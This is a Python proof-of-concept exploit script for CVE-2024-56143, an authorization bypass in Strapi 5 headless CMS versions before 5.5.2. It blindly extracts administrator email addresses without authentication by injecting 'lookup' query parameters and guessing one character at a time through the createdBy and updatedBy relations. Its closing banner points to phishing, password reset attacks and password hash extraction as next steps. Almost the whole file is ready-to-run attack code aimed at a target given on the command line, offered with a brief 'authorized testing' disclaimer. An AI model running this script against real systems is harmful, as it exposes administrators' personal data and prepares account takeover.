#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Strapi 5 IDOR — Admin Email Enumeration
# CVE            : CVE-2024-56143
# Vendor         : Strapi Solutions SAS
# Product        : Strapi (headless CMS)
# Affected       : >= 5.0.0, < 5.5.2
# Type           : CWE-639 - Authorization Bypass Through User-Controlled Key
# CVSS           : 8.2 (High)
# Platform       : Any (Node.js)
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-10-16
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Strapi 5 IDOR — Admin Email Enumeration via lookup Parameter Injection

Demonstrates blind extraction of admin email addresses from Strapi 5.x via
the unsanitized `lookup` query parameter targeting the `email` field on the
`createdBy`/`updatedBy` relation.

ATTACK CHAIN:
  1. Confirm email field is accessible via lookup injection
  2. Extract admin email character-by-character using $startsWith
  3. Verify extracted email with $eq exact match
  4. Test updatedBy relation as alternative attack path

PREREQUISITES:
  - Strapi 5.x instance (>= 5.0.0, < 5.5.2)
  - At least one content type with public read access and published entries

REFERENCES:
  - CVE-2024-56143
  - https://github.com/strapi/strapi/security/advisories/GHSA-495j-h493-42q2
"""

import sys
import json
import string
import time
import urllib.request
import urllib.parse
import urllib.error


# Email charset: letters, digits, common email special chars
EMAIL_CHARSET = (
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789"
    "@._-+"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
)

DEFAULT_HOST = "localhost"
DEFAULT_PORT = 1337
DEFAULT_CONTENT_TYPE = "articles"
TIMEOUT = 10
MAX_EMAIL_LENGTH = 80


def check_lookup(base_url, relation, field, operator, value):
    """
    Send a lookup-injection request and return True if condition matched.
    """
    param_key = f"lookup[{relation}][{field}][{operator}]"
    query_string = urllib.parse.urlencode({param_key: value})
    url = f"{base_url}?{query_string}"

    try:
        req = urllib.request.Request(url, method="GET")
        req.add_header("Accept", "application/json")
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            body = json.loads(resp.read().decode())
            data = body.get("data", [])
            return len(data) > 0
    except urllib.error.HTTPError:
        return False
    except (urllib.error.URLError, TimeoutError) as e:
        print(f"  [!] Connection error: {e}")
        return False


def confirm_email_field_accessible(base_url):
    """
    Confirm that the email field is accessible via lookup injection.
    We use $contains with '@' since all emails contain '@'.
    """
    print("[*] Step 1: Confirming email field is accessible via lookup injection...")

    # Positive test: all emails contain '@'
    positive = check_lookup(base_url, "createdBy", "email", "$contains", "@")
    # Negative test: no email should contain this garbage
    negative = check_lookup(base_url, "createdBy", "email", "$startsWith", "ZZZNOTANEMAIL999")

    if positive and not negative:
        print("[+] Email field accessible! Blind enumeration possible.")
        return True
    else:
        print("[-] Cannot access email field via lookup injection.")
        return False


def extract_email(base_url, relation="createdBy"):
    """
    Extract admin email address character-by-character using $startsWith.
    Emails are shorter than bcrypt hashes, so extraction is faster.
    """
    print(f"\n[*] Step 2: Extracting admin email via {relation} relation...")

    known = ""
    request_count = 0
    start_time = time.time()

    for position in range(MAX_EMAIL_LENGTH):
        found = False
        for char in EMAIL_CHARSET:
            test_value = known + char
            request_count += 1
            result = check_lookup(
                base_url, relation, "email", "$startsWith", test_value
            )
            if result:
                known = test_value
                elapsed = time.time() - start_time
                rate = request_count / elapsed if elapsed > 0 else 0
                print(f"  [+] Position {position + 1:2d}: '{char}' → {known}  "
                      f"({request_count} reqs, {rate:.1f} req/s)")
                found = True
                break

        if not found:
            print(f"\n[*] No match at position {position + 1}. Extraction complete.")
            break

    elapsed = time.time() - start_time
    print(f"[*] Extraction finished in {elapsed:.1f}s ({request_count} requests)")
    return known


def verify_email(base_url, email, relation="createdBy"):
    """
    Verify extracted email with $eq operator.
    """
    print(f"\n[*] Step 3: Verifying extracted email with $eq...")
    result = check_lookup(base_url, relation, "email", "$eq", email)
    if result:
        print(f"[+] VERIFIED: Email '{email}' confirmed with exact match.")
    else:
        print("[-] WARNING: Exact match failed. Email may be incomplete.")
    return result


def test_updatedby_relation(base_url, email):
    """
    Test if the same email is also accessible via the updatedBy relation.
    This demonstrates that BOTH relations are exploitable.
    """
    print(f"\n[*] Step 4: Testing updatedBy relation (alternative attack path)...")
    result = check_lookup(base_url, "updatedBy", "email", "$eq", email)
    if result:
        print(f"[+] updatedBy relation also exposes email: {email}")
        print("    Both createdBy and updatedBy are exploitable.")
    else:
        print("[-] updatedBy relation did not return results for this email.")
    return result


def exploit(target_host, target_port, content_type):
    """
    Main exploit flow for email enumeration.
    """
    base_url = f"http://{target_host}:{target_port}/api/{content_type}"

    print("=" * 70)
    print(f"  CVE-2024-56143: Strapi 5 Blind IDOR — Admin Email Enumeration")
    print(f"  Target: {base_url}")
    print("=" * 70)
    print()

    # Step 1: Confirm accessibility
    if not confirm_email_field_accessible(base_url):
        print("\n[!] Email field not accessible. Exiting.")
        sys.exit(1)

    # Step 2: Extract email via createdBy
    email = extract_email(base_url, "createdBy")

    if not email:
        print("\n[!] Failed to extract email. Exiting.")
        sys.exit(1)

    # Step 3: Verify
    verified = verify_email(base_url, email)

    # Step 4: Test alternate relation
    test_updatedby_relation(base_url, email)

    # Summary
    print()
    print("=" * 70)
    print("  RESULTS")
    print("=" * 70)
    print(f"  Vulnerability:    CVE-2024-56143 (Strapi IDOR via lookup parameter)")
    print(f"  Attack Vector:    Admin email enumeration via blind injection")
    print(f"  Target:           {base_url}")
    print(f"  Extracted Email:  {email}")
    print(f"  Verified:         {'Yes' if verified else 'No'}")
    print()
    print("  [+] SUCCESS: Admin email extracted without authentication!")
    print("      This enables targeted phishing, password reset attacks,")
    print("      and combination with password hash extraction (poc.py).")
    print("=" * 70)

    return email


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    content_type = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_CONTENT_TYPE
    exploit(target, port, content_type)
